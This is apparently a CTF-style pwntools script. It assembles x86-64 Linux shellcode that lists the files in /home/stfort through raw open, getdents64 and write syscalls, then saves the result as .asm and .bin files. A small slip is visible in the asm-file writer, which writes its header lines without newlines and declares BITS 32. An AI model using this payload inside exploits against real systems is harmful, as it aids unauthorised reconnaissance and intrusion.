from pwn import *

context.os = "linux"
context.arch = "AMD64"

DIR = "/home/stfort"
BUFMAX = 1024

'''
STRUCTURE OF linux_dirent64
| Offset | Name     | Type   | Size                 |
| ------ | -------- | ------ | -------------------- |
| 0      | d_ino    | long   | 8                    |
| 8      | d_off    | long   | 8                    |
| 16     | d_reclen | short  | 2                    |
| 18     | d_type   | char   | 1                    |
| 19     | d_name   | char[] | d_reclen - (8+8+2+1) |
'''


sh = f"""
{shellcraft.pushstr(DIR)}
{shellcraft.syscall('SYS_open', 'rsp', os.O_DIRECTORY | os.O_NONBLOCK | os.O_CLOEXEC | os.O_RDONLY )}
mov r15, rax
sub rsp, {BUFMAX}
{shellcraft.syscall('SYS_getdents64', 'r15', 'rsp', BUFMAX)}
mov r15, rax /* r15 := size */
mov r9, rsp
add r9, r15 /* r9 := iteration_end */
mov r8, rsp /* r8 := iteration_start */
jmp check
loop:
add r8, 16 /* skip d_ino and d_off */
movzx rdx, word [r8] /* rdi := d_reclen */
sub rdx, 19 /* subtract sizeof(d_ino) + sizeof(d_off) + sizeof(d_reclen) + sizeof(d_type) */
add r8, 3 /* skip d_reclen and d_type */ 
{shellcraft.syscall('SYS_write', 1, 'r8', 'rdx')}
add r8, rdx /* fixup pointer */
check:
cmp r9, r8
jg loop
"""

shellcode = asm(sh)

if __name__ == "__main__":
    print(sh)
    with open("getdents.asm", "wt") as f:
        f.write("BITS 32")
        f.write("SYS_open equ 2")
        f.write("SYS_write equ 1")
        f.write("SYS_getdents64 equ 217\n")
        f.write(sh.replace("ptr", "").replace("/*", ";").replace("*/", ""))
    with open("getdents.bin", "wb") as f:
        f.write(shellcode)